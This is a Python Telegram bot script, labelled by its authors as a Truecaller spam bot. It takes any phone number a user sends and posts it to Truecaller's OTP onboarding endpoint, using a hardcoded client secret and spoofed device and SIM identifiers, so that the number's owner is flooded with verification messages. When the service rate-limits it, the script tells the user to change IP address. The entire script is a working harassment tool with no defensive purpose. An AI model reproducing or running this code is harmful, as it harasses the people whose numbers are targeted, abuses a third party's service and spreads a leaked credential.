import telebot
import requests
import random
import string
import json  # مكتبة للتعامل مع رد السيرفر

# طباعة الحقوق
print("@psh_team")

# طلب التوكن
token = input("token: ")
bot = telebot.TeleBot(token)

# دالة توليد آيدي عشوائي
def gigk(length=16):
    return ''.join(random.choice(string.hexdigits) for _ in range(length)).lower()

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("قناة المطور", url="https://t.me/SHADOWEYETTEA"))
    
    bot.reply_to(message, 
                 "اهلا بك في بوت سبام Truecaller المتطور 🚀\nارسل الرقم بصيغة: 10xxxxxxxxx",
                 reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def send_spam(message):
    number = message.text
    
    # تنبيه المستخدم أن العملية بدأت
    status_msg = bot.reply_to(message, "⏳ جاري الاتصال بالسيرفر...")

    url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
    
    headers = {
        "Host": "account-asia-south1.truecaller.com",
        "content-type": "application/json; charset=UTF-8",
        "accept-encoding": "gzip",
        "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
        "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
    }
    
    data = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34,"store": "GOOGLE_PLAY"},
            "device": {
                "deviceId": gigk(16),
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": ["8920022021714943876f", "8920022022805258505f"]
            },
            "language": "ar",
            "sims": [{"imsi": "602022207634386", "mcc": "602", "mnc": "2", "operator": "vodafone"}, {"imsi": "602023133590849", "mcc": "602", "mnc": "2", "operator": "vodafone"}],
            "storeVersion": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34}
        },
        "phoneNumber": number,
        "region": "region-2",
        "sequenceNo": 1
    }
    
    try:
        req = requests.post(url, json=data, headers=headers)
        
        # --- الجزء الجديد: تحليل الرد ---
        try:
            # محاولة قراءة الرد كـ JSON
            response_json = req.json()
            
            # استخراج الرسالة والحالة من الرد
            api_status = response_json.get("status", "Unknown")
            api_message = response_json.get("message", "No Message")
            
            # تنسيق الرسالة التي ستصلك
            if req.status_code == 200 and (api_status == 1 or api_status == 2):
                final_reply = f"✅ **تم الإرسال بنجاح!**\n\n📡 كود الحالة: {req.status_code}\n📩 رد السيرفر: {api_message}"
            elif req.status_code == 429:
                final_reply = f"⚠️ **محظور مؤقتاً (Too Many Requests)**\n\nحاول بعد قليل أو غيّر الآي بي."
            else:
                final_reply = f"❌ **فشل الإرسال**\n\n📡 كود الخطأ: {req.status_code}\n📩 السبب: {api_message}\n📝 المحتوى الكامل: {response_json}"

        except json.JSONDecodeError:
            # في حالة كان الرد نص عادي وليس JSON
            final_reply = f"⚠️ **رد غير متوقع من السيرفر**\n\nCode: {req.status_code}\nText: {req.text}"

        # تعديل الرسالة لإظهار النتيجة
        bot.edit_message_text(final_reply, message.chat.id, status_msg.message_id, parse_mode="Markdown")
        
        # طباعة للمراقبة في التيرمينال
        print(f"Number: {number} | Status: {req.status_code} | Body: {req.text}")

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ برمجي: {e}")
        print(e)

bot.infinity_polling()